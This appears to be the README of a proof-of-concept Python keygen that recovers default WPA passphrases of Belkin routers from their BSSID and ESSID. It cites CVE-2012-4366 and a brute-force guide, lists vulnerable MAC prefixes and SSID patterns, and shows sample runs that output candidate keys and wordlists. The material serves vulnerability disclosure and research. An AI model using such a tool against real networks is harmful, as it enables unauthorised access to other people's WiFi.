Vulnerability on WPA generation algorithm on Belkin routers 
==

+ PoC Keygen for WiFi routers manufactured by Belkin. So far only WiFi networks with essid like Belkin.XXXX, Belkin_XXXXXX, belkin.xxx and belkin.xxxx are likely vulnerable, although routers using those macaddresses could be vulnerable as well.

References
----

* [0] PDF by NumLock:  http://ednolo.alumnos.upv.es/papers/wifi/BELKIN_WPA_algorithm.pdf
https://forums.kali.org/showthread.php?18943-Belkin-SSID-and-WPA-WPA2-correlation
* [1] CVE-2012-4366 :  Insecure default WPA2 passphrase in multiple Belkin wireless routers
http://www.jakoblell.com/blog/2012/11/19/cve-2012-4366-insecure-default-wpa2-passphrase-in-multiple-belkin-wireless-routers/
* [2] Bruteforce by using oclHashcat : http://ednolo.alumnos.upv.es/?p=1686
https://www.youtube.com/watch?v=iyJIwr6Ca3U
* [3] CVE-2012-6371: Insecure default WPS pin in some Belkin wireless routers
http://ednolo.alumnos.upv.es/?p=1295


Contact
----

Coder  : Eduardo Novella    Twitter : [@enovella_](https://twitter.com/enovella_) && [@WiFiSlaX4](https://twitter.com/WiFiSlaX4_)     
Website: (http://ednolo.alumnos.upv.es/)


Changelog
----
- 1.5   [2014-05-09] Bruteforce function more readable
- 1.4   [2014-05-06] Fixed an exception with only -a as parameter, remove "ghost model"(F9J1101) and leave out ORDER_3
- 1.3   [2014-04-04] Fixed an exception with bssids like larger or equal than FF:FF:FF:FF:FF:FE
- 1.2   [2014-04-01] Added extra keys when it's being used flag -allkeys, fixed file writing  when -a is not activated
- 1.1   [2014-03-31] Delete duplicate keys. New order
- 1.0   [2014-03-29] First version. 


Licence
----
GPLv3
http://gplv3.fsf.org/

More info
----

+ http://ednolo.alumnos.upv.es

Usage
----

	$ python belkin4xx.py -h
	usage: belkin4xx.py [-h] [-b [BSSID]] [-e [ESSID]] [-v] [-w [WORDLIST]]
		            [-a | -l]

	>>> Keygen for WiFi routers manufactured by Belkin. So far only WiFi networks
	with essid like Belkin.XXXX, Belkin_XXXXXX, belkin.xxx and belkin.xxxx are
	likely vulnerable, although routers using those macaddresses could be
	vulnerable as well. Twitter: @enovella_ and email: ednolo[at]inf.upv.es

	optional arguments:
	  -h, --help            show this help message and exit
	  -v, --version         show program's version number and exit
	  -w [WORDLIST], --wordlist [WORDLIST]
		                Filename to store keys
	  -a, --allkeys         Create all possible cases. Definitely recommended if
		                first attempt fails
	  -l, --list            List all vulnerable mac address so far

	required:
	  -b [BSSID], --bssid [BSSID]
		                Target bssid
	  -e [ESSID], --essid [ESSID]
		                Target essid. [BelkinXXXX,belkin.XXXX]

	(+) Help: python belkin4xx.py -b 94:44:52:00:C0:DE -e Belkin.c0de


	$ python belkin4xx.py -l
	[+] Possible vulnerable targets so far:

		 essid: Belkin.XXXX
		 essid: Belkin_XXXXXX
		 essid: belkin.xxxx
		 essid: belkin.xxx

		 bssid: 94:44:52:uv:wx:yz 
		 bssid: 08:86:3B:uv:wx:yz 
		 bssid: EC:1A:59:uv:wx:yz 

	$ python belkin4xx.py -b 94:44:52:00:C0:DE -e Belkin.c0de
	[+] Your WPA key might be :
	040D93B0

	$ python belkin4xx.py -b 94:44:52:00:ce:d0 -e belkin.ed0
	[+] Your WPA key might be :
	d49496b9

	$ python belkin4xx.py -b 94:44:52:00:ce:d0 -a
	[+] Your WPA keys might be :
	64949db9
	D40493B0
	649996b9
	649496b9
	d49496b9
	34029DB0
	d49996b9
	D40293B0
	64999db9
	340493B0
	34009DB0
	340093B0
	34049DB0
	340293B0
	D40093B0


	$ python belkin4xx.py -b 94:44:52:00:ce:d0 -a -w keys.txt
	$ cat keys.txt 
	64949db9
	D40493B0
	649996b9
	649496b9
	d49496b9
	34029DB0
	d49996b9
	D40293B0
	64999db9
	340493B0
	34009DB0
	340093B0
	34049DB0
	340293B0
	D40093B0







	
